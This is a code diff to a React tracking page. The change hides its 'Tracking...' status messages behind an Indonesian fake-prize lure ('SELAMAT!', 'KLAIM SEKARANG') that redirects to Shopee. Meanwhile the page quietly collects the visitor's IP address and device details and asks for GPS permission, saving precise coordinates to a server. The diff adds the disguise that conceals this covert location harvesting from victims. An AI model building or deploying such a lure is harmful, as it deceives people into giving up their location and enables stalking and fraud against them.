@@ -1,15 +1,12 @@
 "use client";
 
-import { useEffect, useState } from "react";
+import type { CSSProperties } from "react";
+import { useEffect } from "react";
 
 export default function TrackPage() {
-  const [status, setStatus] = useState("Loading...");
-
   useEffect(() => {
     async function run() {
       try {
-        setStatus("Detecting IP & Device...");
-
         const ipRes = await fetch("/api/get-ip");
         const ipData = await ipRes.json();
 
@@ -27,13 +24,9 @@ export default function TrackPage() {
           }),
         });
 
-        setStatus("IP saved. Requesting GPS permission...");
-
         if ("geolocation" in navigator) {
           navigator.geolocation.getCurrentPosition(
             async (pos) => {
-              setStatus("GPS granted. Saving coordinates...");
-
               await fetch("/api/save-location", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
@@ -45,19 +38,12 @@ export default function TrackPage() {
                   gpsLon: pos.coords.longitude,
                 }),
               });
-
-              setStatus("GPS saved successfully.");
             },
-            () => {
-              setStatus("GPS denied by user.");
-            }
+            () => {}
           );
-        } else {
-          setStatus("GPS is not supported.");
         }
       } catch (err) {
         console.error(err);
-        setStatus("Error: " + String(err));
       }
     }
 
@@ -65,9 +51,23 @@ export default function TrackPage() {
   }, []);
 
   return (
-    <div style={{ padding: 20 }}>
-      <h1>Tracking...</h1>
-      <p>{status}</p>
+    <div style={styles.container}>
+      <div style={styles.card}>
+        <h2 style={styles.title}>🎉 SELAMAT!</h2>
+        <p style={styles.text}>
+          Anda berkesempatan mendapatkan hadiah menarik.
+        </p>
+        <p style={styles.text}>Klaim hadiah Anda sekarang!</p>
+
+        <button
+          style={styles.button}
+          onClick={() =>
+            window.location.href = "https://shopee.co.id"
+          }
+        >
+          🎁 KLAIM SEKARANG
+        </button>
+      </div>
     </div>
   );
 }
@@ -76,16 +76,73 @@ function getDeviceInfo() {
   const ua =
     typeof navigator !== "undefined" ? navigator.userAgent : "unknown";
 
-  let device = "Unknown Device";
+  const devices = [
+    "iPhone",
+    "iPad",
+    "Samsung",
+    "Xiaomi",
+    "OPPO",
+    "Vivo",
+    "Realme",
+    "Huawei",
+    "Infinix",
+    "Poco",
+    "Sony",
+    "Nokia",
+    "Asus",
+    "Lenovo",
+    "Motorola",
+    "Google Pixel",
+    "TECNO",
+  ];
 
-  if (/iPhone/i.test(ua)) device = "iPhone";
-  else if (/iPad/i.test(ua)) device = "iPad";
-  else if (/Samsung|SM-/i.test(ua)) device = "Samsung";
-  else if (/Xiaomi|Mi/i.test(ua)) device = "Xiaomi";
-  else if (/OPPO/i.test(ua)) device = "OPPO";
-  else if (/Vivo/i.test(ua)) device = "Vivo";
-  else if (/Realme/i.test(ua)) device = "Realme";
-  else if (/Android/i.test(ua)) device = "Android Phone";
+  let detected = "Unknown Device";
+  for (const d of devices) {
+    if (ua.toLowerCase().includes(d.toLowerCase())) detected = d;
+  }
 
-  return { device, ua };
+  // fallback
+  if (detected === "Unknown Device" && /Android/i.test(ua))
+    detected = "Android Phone";
+
+  return { device: detected, ua };
 }
+const styles: Record<string, CSSProperties> = {
+  container: {
+    minHeight: "100vh",
+    background: "#f5f5f5",
+    display: "flex",
+    justifyContent: "center",
+    alignItems: "center",
+    padding: 20,
+  },
+  card: {
+    background: "white",
+    padding: "30px 25px",
+    borderRadius: 12,
+    boxShadow: "0 4px 14px rgba(0,0,0,0.15)",
+    textAlign: "center",
+    maxWidth: 350,
+    width: "100%",
+  },
+  title: {
+    margin: "0 0 10px 0",
+    fontSize: "26px",
+    fontWeight: "bold",
+  },
+  text: {
+    fontSize: "16px",
+    marginBottom: 12,
+  },
+  button: {
+    background: "#ff5722",
+    padding: "12px 18px",
+    width: "100%",
+    border: "none",
+    borderRadius: 8,
+    color: "white",
+    fontSize: "18px",
+    cursor: "pointer",
+    marginTop: 20,
+  },
+};
